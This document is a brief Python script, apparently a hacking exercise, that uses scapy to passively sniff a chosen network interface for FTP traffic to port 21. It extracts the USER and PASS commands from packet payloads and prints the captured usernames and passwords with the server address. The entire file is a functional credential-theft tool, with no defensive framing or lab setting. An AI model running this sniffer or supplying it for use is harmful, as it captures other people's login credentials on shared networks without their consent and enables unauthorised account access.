import scapy.all as scapy
import re
def ftpSniff(pkt):	
	if pkt.haslayer(scapy.TCP):
		if pkt.getlayer(scapy.TCP).dport==21:
			if not(pkt.getlayer(scapy.Raw)==None):
				addr=str(pkt.getlayer(scapy.IP).dst)
				text=str(pkt.getlayer(scapy.Raw))
				user=re.findall("USER(.*)",text)
				passw=re.findall("PASS(.*)",text)
				print("FTP at "+addr)
				print("User"+str(user))
				print("Password"+str(passw))
def main():
	intrface=str(input("Enter interface to sniff"))
	print("Starting sniffer on "+intrface)
	scapy.sniff(iface=intrface,prn=ftpSniff)
main()
